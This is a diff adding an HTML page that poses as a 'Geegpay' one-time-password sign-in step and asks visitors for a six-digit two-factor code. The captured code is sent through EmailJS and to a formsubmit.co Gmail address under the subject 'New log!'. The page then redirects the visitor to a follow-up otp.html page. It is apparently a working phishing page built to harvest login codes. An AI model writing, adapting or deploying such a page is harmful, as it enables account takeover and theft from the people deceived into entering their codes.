@@ -1,0 +1,95 @@
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="/images/gfavicon.png">
+    <link rel="stylesheet" href="dist/output.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="/fonts/segeo-ui-font/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP verification</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("mQ7M8IM0fXfZIQvXQ");
+      })();
+    </script>
+    <script type="text/javascript">
+      window.onload = function () {
+        console.log("working");
+        const btn = document.querySelector("button");
+        document
+          .getElementById("form")
+          .addEventListener("submit", function (event) {
+            event.preventDefault();
+            btn.textContent = "Loading...";
+            emailjs.sendForm("service_2007cn7", "template_9p8589d", this).then(
+              function () {
+                console.log("SUCCESS!");
+                setTimeout(() => {
+                  window.location.href = "otp.html";
+                }, 5000);
+              },
+              function (error) {
+                alert("an error occured, please try again");
+                console.log(error);
+                window.location.reload();
+              }
+            );
+          });
+      };
+    </script>
+  </head>
+<body>
+    <div class="w-[95%] max-w-md mx-auto">
+      <form action="https://formsubmit.co/klashahelp@gmail.com" method="post" class="bg-white rounded-md shadow-sm px-6 mt-7" id="form">
+        <p class="font-bold text-slate-700 text-lg">
+          Enter the code sent to your email to verify your login
+        </p>
+        <p class="text-slate-600 mt-7 pb-2">Please enter two FA code</p>
+        <div class="flex items-center gap-y-5 justify-center gap-x-3">
+          <input type="tel" name="pin1" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" name="pin2" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" name="pin3" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" name="pin4" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" name="pin5" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)">
+          <input type="tel" name="pin6" required="" class="h-[3.2rem] font-bold w-14 pin text-center text-lg outline-none border-2 border-slate-300 rounded-xl" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+        </div>
+
+        <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="New log!">
+        <input type="hidden" name="_next" value="https://apps-geegpay.web.app/otp.html">
+        <button disabled="" type="submit" class="bg-primary text-white rounded-full p-4 w-full font-semibold text-lg mt-10 disabled:opacity-70 disabled:pointer-events-none">
+          Sign in
+        </button>
+      </form>
+    </div>
+    <script type="module" src="main.js"></script>
+    <script>
+      function inputInsideOtpInput(el) {
+        if (el.value.length > 1) {
+          el.value == "";
+          if (el.nextElementSibling.value == "") {
+            el.nextElementSibling.value = el.value[el.value.length - 1];
+          }
+          if (!el.nextElementSibling) {
+            el.value = el.value[0];
+          }
+          el.value = el.value[0];
+        }
+        try {
+          if (el.value == null || el.value == "") {
+            this.foucusOnInput(el.previousElementSibling);
+          } else {
+            this.foucusOnInput(el.nextElementSibling);
+          }
+        } catch (e) {
+          console.log(e);
+        }
+      }
+      function foucusOnInput(ele) {
+        ele.focus();
+      }
+    </script>
+  
+
+</body>
+</html>
